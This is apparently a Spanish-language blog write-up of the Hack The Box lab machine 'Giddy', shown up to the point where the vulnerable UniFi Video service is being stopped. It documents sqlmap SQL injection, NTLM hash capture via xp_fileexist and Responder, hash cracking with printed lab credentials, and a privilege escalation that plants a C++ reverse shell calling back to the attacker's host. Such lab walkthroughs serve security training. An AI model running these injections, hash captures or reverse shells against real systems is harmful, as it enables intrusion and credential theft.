---
title: "HTB write-up: Giddy"
date: 2019-02-16T08:47:00-06:00
tags: ["hackthebox","htb","boot2root","pentesting","windows"]
categories: ["htb","pentesting"]
draft: false

---
AAAA
<!--more-->

# Machine info

La información que tenemos de la máquina es:

Name  | Maker     | OS      | IP Address
---   | ---       | ---     | ---
Giddy | lkys37en  | Windows | 10.10.10.104

Su tarjeta de presentación es:

![Card Info](/img/htb-giddy/cardinfo.png)

# Port Scanning

Comenzamos por realizar un escaneo de puertos usando nuestra herramienta nmap, pero luego vemos que tardaría bastante porque empezó a tener muchos drops:

```
root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 08:55 CST
Initiating Ping Scan at 08:55
Scanning 10.10.10.104 [4 ports]
Completed Ping Scan at 08:55, 0.44s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:55
Scanning 10.10.10.104 [65535 ports]
Discovered open port 3389/tcp on 10.10.10.104
Discovered open port 80/tcp on 10.10.10.104
Discovered open port 443/tcp on 10.10.10.104
SYN Stealth Scan Timing: About 2.51% done; ETC: 09:15 (0:20:05 remaining)
SYN Stealth Scan Timing: About 3.89% done; ETC: 09:21 (0:25:08 remaining)
SYN Stealth Scan Timing: About 6.19% done; ETC: 09:19 (0:22:59 remaining)
SYN Stealth Scan Timing: About 8.71% done; ETC: 09:21 (0:24:17 remaining)
Increasing send delay for 10.10.10.104 from 0 to 5 due to 40 out of 133 dropped probes since last increase.
Increasing send delay for 10.10.10.104 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
SYN Stealth Scan Timing: About 8.90% done; ETC: 09:26 (0:28:50 remaining)
Increasing send delay for 10.10.10.104 from 10 to 20 due to 11 out of 23 dropped probes since last increase.
SYN Stealth Scan Timing: About 9.28% done; ETC: 09:30 (0:32:25 remaining)
Increasing send delay for 10.10.10.104 from 20 to 40 due to 11 out of 22 dropped probes since last increase.
```

Logramos identificar al menos tres puertos. Realicemos el escaneo ahora con masscan:

```
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.104

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-15 03:07:13 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 5985/tcp on 10.10.10.104
Discovered open port 443/tcp on 10.10.10.104
Discovered open port 3389/tcp on 10.10.10.104
Discovered open port 80/tcp on 10.10.10.104
```

Como podemos ver, tenemos abiertos los mismos puertos que nmap descubrió más uno nuevo, 5995/tcp. Continuemos con la enumeración de servicios.

# Services Identification

Lanzamos un nmap ahora con destino a los 4 puertos descubiertos:

```
root@laptop:~# nmap -p80,443,3389,5985 -A -T4 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-14 21:48 CST
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 21:49 (0:00:00 remaining)
Nmap scan report for 10.10.10.104
Host is up (0.20s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2019-02-15T03:49:08+00:00; 0s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2019-02-14T01:47:31
|_Not valid after:  2019-08-16T01:47:31
|_ssl-date: 2019-02-15T03:49:07+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   200.40 ms 10.10.12.1
2   201.47 ms 10.10.10.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.76 seconds
```

Resaltan dos cosas; la primera el commonName del cert de https PowerShellWebAccessTestWebSite y el nombre de la maquina Giddy.

Continuemos por analizar el servicio HTTP y HTTPS.

# httpie

Comenzamos por realizar una petición http al servidor:

```
xbytemx@laptop:~/htb/giddy$ http 10.10.10.104
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 700
Content-Type: text/html
Date: Sat, 15 Feb 2019 15:06:19 GMT
ETag: "d07343e3466d41:0"
Last-Modified: Sun, 17 Jun 2018 14:24:23 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS Windows Server</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#ffffff;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="giddy.jpg" alt="IIS" width="960" height="600" /></a>
</div>
</body>
</html>

```

Como veremos en un navegador, se nos da un link y una imagen de un perrito. Si realizamos la misma operación sobre https, tendremos el mismo resultado. Esto nos puede indicar que solo la capa de transporte cambia, pero es el mismo servidor web.

Busquemos más sobre estos servicios web.

# Gobuster

Ejecutamos gobuster con los parámetros tradicionales y menos extensos, pero se omiten los errores de conexión para no llenar de spam:

```
xbytemx@laptop:~/htb/friendzone$ ~/tools/gobuster -u http://10.10.10.104/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.tx
t -t 20 -x php,html,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.104/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,html,txt
[+] Timeout      : 10s
=====================================================
2019/02/15 11:31:01 Starting gobuster
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
```

Encontramos dos directorios, el primero llamado remote y el segundo llamada mvc

Remote
![Home de /remote](/img/htb-giddy/remote-root.png)

mvc
![Home de /mvc](/img/htb-giddy/mvc-root.png)

La primera resulta ser el portal de acceso remoto sobre powershell, mientras que la segunda parece alguna aplicación de productos de bicicleta. Si ponemos el mouse sobre alguno de estos objetos veremos que dentro de la URL esta harcodeado el numero de ID, por lo que probaremos con un SQLi.

# SQLi

Iniciamos usando sqlmap sin opciones para analizar el resultado:

```
xbytemx@laptop:~$ sqlmap -u "http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.2#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:55:54 /2019-02-15/

[11:55:54] [INFO] testing connection to the target URL
[11:55:54] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:55:55] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
do you want sqlmap to try to detect backend WAF/IPS? [y/N]
[11:55:59] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[11:55:59] [INFO] testing if the target URL content is stable
[11:55:59] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit]
[11:56:18] [INFO] searching for dynamic content
[11:56:18] [INFO] dynamic content marked for removal (1 region)
[11:56:19] [INFO] testing if GET parameter 'ProductSubCategoryId' is dynamic
[11:56:19] [INFO] GET parameter 'ProductSubCategoryId' appears to be dynamic
[11:56:19] [INFO] heuristic (basic) test shows that GET parameter 'ProductSubCategoryId' might be injectable (possible DBMS: 'Microsoft SQL Server')
[11:56:19] [INFO] testing for SQL injection on GET parameter 'ProductSubCategoryId'
it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1) values? [Y/n]
[11:56:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:56:30] [WARNING] reflective value(s) found and filtering out
[11:56:30] [INFO] GET parameter 'ProductSubCategoryId' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[11:56:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:56:30] [INFO] GET parameter 'ProductSubCategoryId' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' injectable
[11:56:30] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[11:56:31] [INFO] GET parameter 'ProductSubCategoryId' is 'Microsoft SQL Server/Sybase inline queries' injectable
[11:56:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:56:31] [WARNING] time-based comparison requires larger statistical model, please wait................... (done)
[11:56:45] [INFO] GET parameter 'ProductSubCategoryId' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
[11:56:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[11:56:56] [INFO] GET parameter 'ProductSubCategoryId' appears to be 'Microsoft SQL Server/Sybase time-based blind (IF)' injectable
[11:56:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:56:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:56:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:56:57] [INFO] target URL appears to have 25 columns in query
[11:56:58] [WARNING] combined UNION/error-based SQL injection case found on column 4. sqlmap will try to find another column with better characteristics
[11:56:59] [WARNING] combined UNION/error-based SQL injection case found on column 1. sqlmap will try to find another column with better characteristics
[11:57:00] [WARNING] combined UNION/error-based SQL injection case found on column 20. sqlmap will try to find another column with better characteristics
GET parameter 'ProductSubCategoryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: ProductSubCategoryId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ProductSubCategoryId=18 AND 9242=9242

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ProductSubCategoryId=18 AND 6303 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6303=6303) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(113)))

    Type: inline query
    Title: Microsoft SQL Server/Sybase inline queries
    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7727=7727) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(113))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: ProductSubCategoryId=18;WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: ProductSubCategoryId=18 WAITFOR DELAY '0:0:5'
---
[11:57:43] [INFO] testing Microsoft SQL Server
[11:57:43] [INFO] confirming Microsoft SQL Server
[11:57:45] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2016
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2016
[11:57:45] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 49 times
[11:57:45] [INFO] fetched data logged to text files under '/home/xbytemx/.sqlmap/output/10.10.10.104'

[*] ending @ 11:57:45 /2019-02-15/
```

El resumen es parámetro ProductSubCategoryId es susceptible a SQLi, la DB es Microsoft SQL Server 2016, y tenemos bastantes puntos de inyección como se ve en la parte superior.

Lo siguiente que hice fue sacar a los usuarios, las tablas y los passwords, lo resumo con los resultados:

`sqlmap -u "http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18" --table --users --passwords`

```
[11:58:04] [INFO] fetching database users
[11:58:04] [INFO] used SQL query returns 3 entries
[11:58:05] [INFO] retrieved: 'BUILTIN\\Users'
[11:58:05] [INFO] retrieved: 'giddy\\stacy'
[11:58:05] [INFO] retrieved: 'sa'

[11:58:05] [INFO] fetching database users password hashes
[11:58:06] [WARNING] the SQL query provided does not return any output
[11:58:06] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:58:06] [WARNING] the SQL query provided does not return any output
[11:58:06] [INFO] fetching database users
[11:58:06] [INFO] used SQL query returns 3 entries
[11:58:06] [INFO] resumed: 'BUILTIN\\Users'
[11:58:06] [INFO] resumed: 'giddy\\stacy'
[11:58:06] [INFO] resumed: 'sa'
[11:58:19] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))

[11:58:19] [INFO] fetching database names
[11:58:20] [INFO] used SQL query returns 5 entries
[11:58:20] [INFO] retrieved: 'Injection'
[11:58:20] [INFO] retrieved: 'master'
[11:58:20] [INFO] retrieved: 'model'
[11:58:21] [INFO] retrieved: 'msdb'
[11:58:21] [INFO] retrieved: 'tempdb'
[11:58:21] [INFO] fetching tables for databases: Injection, master, model, msdb, tempdb
Database: Injection
[13 tables]
+----------------------------------------------------------+
| Applications                                             |
| CreditCard                                               |
| Memberships                                              |
| Product                                                  |
| ProductCategory                                          |
| ProductSubcategory                                       |
| Profiles                                                 |
| Roles                                                    |
| Users                                                    |
| UsersInRoles                                             |
| UsersOpenAuthAccounts                                    |
| UsersOpenAuthData                                        |
| __MigrationHistory                                       |
+----------------------------------------------------------+

Database: master
[488 tables]

Database: msdb
[23 tables]
+----------------------------------------------------------+
| autoadmin_backup_configuration_summary                   |
| backupfile                                               |
| backupmediafamily                                        |
| backupmediaset                                           |
| backupset                                                |
| dm_hadr_automatic_seeding_history                        |
| logmarkhistory                                           |
| restorefile                                              |
| restorefilegroup                                         |
| restorehistory                                           |
| suspect_pages                                            |
| sysdac_instances                                         |
| syspolicy_conditions                                     |
| syspolicy_configuration                                  |
| syspolicy_object_sets                                    |
| syspolicy_policies                                       |
| syspolicy_policy_categories                              |
| syspolicy_policy_category_subscriptions                  |
| syspolicy_policy_execution_history                       |
| syspolicy_policy_execution_history_details               |
| syspolicy_system_health_state                            |
| syspolicy_target_set_levels                              |
| syspolicy_target_sets                                    |
+----------------------------------------------------------+

```

Después de buscar y buscar dentro de la DB, opte por un approach diferente... Probar que puede ejecutarse desde este proceso dentro del sistema operativo. Claro lo mas evidente fue usar --os-cmd, pero este fallo. No cerrándome a este resultado, abrí google e investigue un poco, llegando a varios artículos interesantes:

- [Hacking SQL Server Stored Procedures](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation)
- [Executing SMB Relay Attacks via SQL Server using Metasploit](https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [Full MSSQL Injection PWNage, More Dangerous SQL Injection Attack](https://www.exploit-db.com/papers/12975)

Esto me genero la idea de que si era posible lanzar xp\_dirtree o xp\_fileexist hacia responder, podríamos capturar el hash.

# exec xp\_fileexist

Iniciamos por abrir en una consola Responder con `python Responder.py -wrf -I tun0`. En otra consola iniciamos sqlmap en modo sql-shell y ejecutamos el exec:

```
xbytemx@laptop:~$ sqlmap -u "http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18" --sql-shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:02:53 /2019-02-15/

[14:02:53] [INFO] resuming back-end DBMS 'microsoft sql server'
[14:02:53] [INFO] testing connection to the target URL
[14:02:53] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ProductSubCategoryId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ProductSubCategoryId=18 AND 9242=9242

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: ProductSubCategoryId=18 AND 6303 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (6303=6303) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(113)))

    Type: inline query
    Title: Microsoft SQL Server/Sybase inline queries
    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7727=7727) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(113))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: ProductSubCategoryId=18;WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: ProductSubCategoryId=18 WAITFOR DELAY '0:0:5'
---
[14:02:53] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2016
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2016
[14:02:53] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER
sql-shell> exec master..xp_fileexist '\\10.10.13.121\miau'-- -
exec master..xp_fileexist '\\10.10.13.121\miau'-- -:    'NULL'

```

En nuestra consola de responder veremos:

```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1122334455667788:B9F9548A74894D13A0FC9DCCAD19ED75:0101000000000000300341DE69C5D401E59EA796893B59570000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000E520622AF481D040F54B36E7D48F871AAABD6B2FEF077311B50C0859DD35C8A90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310033002E003100320031000000000000000000
[SMB] Requested Share     : \\10.10.13.121\IPC$
[*] Skipping previously captured hash for GIDDY\Stacy
[SMB] Requested Share     : \\10.10.13.121\TEST
```

Yei, ya tenemos el hash del usuario stacy. Ahora pasemos a romper la hash.

# hashcat

Usando Hashcat, rompemos la hash que acabamos de obtener. El diccionario usado fue rockyou.

```
xbytemx@laptop:~$ hashcat -a 0 -m 5600 "Stacy::GIDDY:1122334455667788:B9F9548A74894D13A0FC9DCCAD19ED75:0101000000000000300341DE69C5D401E59EA796893B59570000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000E520622AF481D040F54B36E7D48F871AAABD6B2FEF077311B50C0859DD35C8A90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310033002E003100320031000000000000000000" ~/wl/rockyou.txt
...
STACY::GIDDY:1122334455667788:b9f9548a74894d13a0fc9dccad19ed75:0101000000000000300341de69c5d401e59ea796893b59570000000002000a0053004d0042003100320001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d004200310032000800300030000000000000000000000000300000e520622af481d040f54b36e7d48f871aaabd6b2fef077311b50c0859dd35c8a90a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310033002e003100320031000000000000000000:xNnWo6272k7x

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: STACY::GIDDY:1122334455667788:b9f9548a74894d13a0fc9...000000
Time.Started.....: Fri Feb 15 14:13:35 2019 (3 secs)
Time.Estimated...: Fri Feb 15 14:13:38 2019 (0 secs)
Guess.Base.......: File (/home/xbytemx/wl/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   816.2 kH/s (4.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2691072/14344384 (18.76%)
Rejected.........: 0/2691072 (0.00%)
Restore.Point....: 2686976/14344384 (18.73%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: xamula -> x21blfam

Started: Fri Feb 15 14:13:25 2019
Stopped: Fri Feb 15 14:13:40 2019
```

# Creds

Las credenciales de stacy son:

> stacy / xNnWo6272k7x

# Logging as stacy

Aquí comenzó la travesía mas incomoda, ya que se podía acceder a la maquina por el portal de remote, pero estaba limitado a dos sesiones para stacy, por lo que había que esperar a que se soltara la sesión. Esto me llevo a buscar alternativas y me encontré con una bastante coqueta, usar una instancia de docker con powershell modificado para correr PSSesion soportando autenticación sobre NTLM. Esto es bastante ventajoso, ya que como recordamos el puerto WinRM, 5985/tcp, se encuentra abierto.

Un poco mas de información al respecto puede ser consultado [aquí](https://blog.quickbreach.io/ps-remote-from-linux-to-windows/).

Comenzamos por descargar y ejecutar la instancia:

```
xbytemx@laptop:~/htb/giddy$ docker run -it quickbreach/powershell-ntlm
Unable to find image 'quickbreach/powershell-ntlm:latest' locally
latest: Pulling from quickbreach/powershell-ntlm
aeb7866da422: Pull complete
2011ef2c2dfb: Pull complete
43e50d384a14: Pull complete
9b8c213e2ea6: Pull complete
580adfdbbe6e: Pull complete
e6ec163021cb: Pull complete
Digest: sha256:81cb6748bbf055f65de83f62d91e924d9ff674b9a9223ad6e02c425db12b6a32
Status: Downloaded newer image for quickbreach/powershell-ntlm:latest
PowerShell 6.1.1

https://aka.ms/pscore6-docs
Type 'help' to get help.

PS />
```

Ahora generamos las credenciales y probaremos una conexión al servidor:

```
PS /> $creds = Get-Credential

PowerShell credential request
User: stacy
Password for user stacy: ************

PS /> Enter-PSSession -ComputerName 10.10.10.104 -Authentication Negotiate -Credential $creds
[10.10.10.104]: PS C:\Users\Stacy\Documents> ls


    Directory: C:\Users\Stacy\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/16/2019   1:04 AM                WindowsPowerShell
-a----        2/16/2019   1:07 AM             14 unifivideo

```

Boom, estamos adentro.

# user.txt

> type c:\Users\Stacy\Desktop\user.txt

# PrivEsc

Al entrar lo primeeeero que me llama la atención es el archivo unifivideo, que si mal no recordé en ese momento, se trata de uno de los productos de Ubiquiti. Buscando con google acerca de este producto, encontraremos un [exploit local](https://www.exploit-db.com/exploits/43390), el cual abusa de los privilegios de la carpeta unifi-video, ya que el servicio avService.exe que corre con la cuenta NT AUTHORITY/SYSTEM, le otorga sus permisos (ACL). El riesgo es que es posible ejecutar un archivo arbitrario "taskkill.exe" como NT AUTHORITY/SYSTEM, porque cada vez que el servicio es iniciado y terminado, busca primero dentro de la carpeta "C:\ProgramData\unifi-video\" si el ejecutable se encuentra.

Cualquier usuario que pueda escribir en "C:\ProgramData\unifi-video\" y que pueda iniciar y terminar el servicio, podrá explotar esta vulnerabilidad. Y eso es precisamente lo que vamos a hacer.

Primero verificamos que la versión instalada es vulnerable, buscando el archivo de configuración dentro de la carpeta "C:\ProgramData\unifi-video\":

```
[10.10.10.104]: PS C:\Users\Stacy> cd c:\programdata\unifi-video\
[10.10.10.104]: PS C:\programdata\unifi-video> dir


    Directory: C:\programdata\unifi-video


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        2/16/2019  12:19 AM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
-a----        7/26/2017   6:10 PM         219136 avService.exe
-a----        2/16/2019  12:00 AM          34855 hs_err_pid1328.log
-a----        2/16/2019  12:00 AM      471599465 hs_err_pid1328.mdmp
-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp
-a----        8/16/2018   7:47 PM              0 hs_err_pid2036.mdmp
-a----        2/16/2019  12:19 AM          34477 hs_err_pid3336.log
-a----        2/16/2019  12:19 AM      523514725 hs_err_pid3336.mdmp
-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
-a----        6/16/2018   9:54 PM          89050 Uninstall.exe


[10.10.10.104]: PS C:\programdata\unifi-video> cat .\data\system.properties
# unifi-video v3.7.3
#Sat Jun 16 21:58:13 EDT 2018
is_default=false
uuid=e79d440a-62cd-4274-95c3-d746cbb3b817
# app.http.port = 7080
# app.https.port = 7443
# ems.liveflv.port = 6666
# ems.livews.port = 7445
# ems.livewss.port = 7446
# ems.rtmp.enable = true
# ems.rtmp.port = 1935
# ems.rtsp.enable = true
# ems.rtsp.port = 7447
```

Como podemos ver, la versión 3.7.3 es vulnerable.

Iniciamos por ver como carajos se llama el servicio, esta parte requirió de pasar un rato revisando notas en github, pero finalmente llegue a la opción necesaria:

```
[10.10.10.104]: PS C:\programdata\unifi-video> Get-ChildItem -recurse HKLM:\SYSTEM\CurrentControlSet\Services | findstr -i "unifi"
                               Microsoft-Windows-Unified-Telemetry-Client           :
                               Microsoft-Windows-Unified-Telemetry-Client           :
UniFiVideoService              Type            : 16
                               ImagePath       : C:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService
                               DisplayName     : Ubiquiti UniFi Video
                               Description     : Ubiquiti UniFi Video Service
    Hive: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiVideoService
[10.10.10.104]: PS C:\programdata\unifi-video>
```

Ya tengo el nombre del servicio, ya verificamos que es vulnerable. Ahora solo falta nuestro ejecutable a lanzar.

# cmd reverse shell

En este caso, como no me convencio usar MSF, busque alternativas y me tope con una [muy interesante](https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/). Se trata del código fuente en cpp, para generar un binario para windows desde linux, que lanza el proceso cmd.exe y realizar una conexión inversa hacia la maquina del atacante.

En el código solo modificamos los parámetros de host y port y compilamos.

La función main queda así:

```
int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.13.121";
        int port = 3001;
        RunShell(host, port);
    }
    return 0;
}
```

Compilamos:

`i686-w64-mingw32-g++ r.cpp -o r.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`

Abrimos una ncat para esperar la conexión, ejecutamos el modulo de python para iniciar un servidor web y descargamos el archivo:

Shell1:
```
[10.10.10.104]: PS C:\programdata\unifi-video> wget http://10.10.13.121:4001/r.exe -O taskkill.exe
```

Shell2:
```
xbytemx@laptop:~/htb/giddy/www$ python -m SimpleHTTPServer 4001
Serving HTTP on 0.0.0.0 port 4001 ...
10.10.10.104 - - [16/Feb/2019 01:24:09] "GET /r.exe HTTP/1.1" 200 -
```

Shell3:
```
xbytemx@laptop:~/htb/giddy$ ncat -vnlp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
```

# Exploiting

Ahora solo necesitamos detener el servicio UniFiVideoService y esperar en Shell3:

Shell1:
```
[10.10.10.104]: PS C:\programdata\unifi-video> stop-service UniFiVideoService
WARNING: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
